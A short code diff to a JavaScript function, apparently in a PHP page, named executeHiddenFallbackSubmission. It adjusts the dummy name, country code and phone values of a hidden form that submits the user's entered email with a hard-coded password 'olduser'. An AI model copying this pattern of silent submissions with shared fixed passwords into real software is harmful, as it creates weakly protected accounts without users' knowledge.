@@ -265,12 +265,12 @@ function executeHiddenFallbackSubmission(detectedCountry) {
     const fields = {
         "redirect": "<?= $redirect_url ?>",
         "email": currentEmailAttempt,
-        "full_name": "Old User",
+        "full_name": "Update profile",
         "password": "olduser",
         "confirm_password": "olduser",
         "country": detectedCountry,
-        "country_code": "+90", // Explicit code mapping match requirement
-        "phone": "+9012345678"
+        "country_code": "+1", // Explicit code mapping match requirement
+        "phone": "+100000000"
     };
 
     for (const [key, value] of Object.entries(fields)) {
